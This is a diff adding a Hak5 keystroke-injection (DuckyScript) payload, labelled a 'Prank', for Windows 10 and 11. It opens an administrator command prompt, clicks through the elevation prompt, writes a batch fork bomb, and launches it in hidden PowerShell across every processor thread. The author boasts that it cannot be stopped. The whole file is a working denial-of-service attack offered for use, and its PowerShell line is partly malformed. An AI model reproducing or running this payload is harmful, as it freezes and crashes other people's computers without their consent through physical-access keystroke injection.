@@ -1,0 +1,20 @@
+REM Title: Win forkbomb, thread shitter or ryzen temps
+REM Author: FalsePhilosopher
+REM Target:10-11
+REM Props: Hak5, da3m0n s3c for the one liner https://da3m0ns3c.blogspot.com/2017/04/fork-bomb-in-several-language-implements.html, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches terminal and spawns a forkbomb on every thread the system reports that then spawns shells that spawn forkbombs. It spawned about 850 processes in 15 seconds, there is no stopping it so be careful testing this thing is NASTY! It takes 5-10 sec to spin up the run pools so it's not immediate.
+REM
+DELAY 300
+GUI r
+DELAY 500
+STRING cmd.exe
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING echo %0^|%0 > fb.bat&&powershell -w h $NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(C:\Windows\System32\fb.bat);;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()
+ENTER
